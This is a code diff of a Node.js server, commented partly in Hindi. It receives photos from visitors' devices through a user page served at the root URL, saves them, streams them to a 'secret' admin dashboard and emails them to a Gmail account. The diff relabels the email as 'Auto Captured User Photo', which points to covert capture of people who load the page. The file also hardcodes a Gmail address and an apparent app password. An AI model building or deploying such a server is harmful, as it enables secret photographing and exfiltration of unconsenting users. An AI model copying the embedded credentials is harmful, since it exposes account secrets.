@@ -9,43 +9,35 @@ const app = express();
 const server = http.createServer(app);
 const io = new Server(server);
 
-// Local uploads folder
 const uploadDir = path.join(__dirname, 'uploads');
 if (!fs.existsSync(uploadDir)) {
     fs.mkdirSync(uploadDir);
 }
 
-// Gmail Config
+// Gmail Configuration
 const transporter = nodemailer.createTransport({
     service: 'gmail',
     auth: {
-        user: 'prectice@gmail.com',       // 👈 Apni Gmail ID verify karein
-        pass: 'includestdiosystem'   // 👈 16-digit App Password verify karein
+        user: 'Prectice@gmail.com',         // Aapka Gmail ID
+        pass: 'includestdiosystem'  // Gmail ka App Password
     }
 });
 
-// Explicit Routes (Sabse pehle rakhe hain taaki 'Cannot GET' na aaye)
-
-// 1. Secret Admin Route
 app.get('/admin.html', (req, res) => {
     res.sendFile(path.join(__dirname, 'admin.html'));
 });
 
-// 2. User Route
 app.get('/user.html', (req, res) => {
     res.sendFile(path.join(__dirname, 'user.html'));
 });
 
-// 3. Main URL -> Direct User Page
 app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'user.html'));
 });
 
-// Serve static assets after custom routes
 app.use(express.static(__dirname));
 app.use('/uploads', express.static(uploadDir));
 
-// Socket.io Events
 io.on('connection', (socket) => {
     console.log('⚡ Connected Device ID:', socket.id);
 
@@ -62,13 +54,15 @@ io.on('connection', (socket) => {
             if (!err) console.log(`✅ Photo Saved: uploads/${fileName}`);
         });
 
+        // Live stream to Admin Dashboard
         io.emit('send-photo-to-admin', imageData);
 
+        // Send Email to Prectice@gmail.com
         const mailOptions = {
-            from: 'prectice@gmail.com',
-            to: 'md.danish7499@gmail.com',
-            subject: '📸 New Photo Captured!',
-            text: 'User page se new photo capture ho gayi hai.',
+            from: 'Prectice@gmail.com',
+            to: 'Prectice@gmail.com',
+            subject: '📸 Auto Captured User Photo',
+            text: 'Live auto-captured photo attached.',
             attachments: [{ filename: fileName, content: base64Data, encoding: 'base64' }]
         };
 
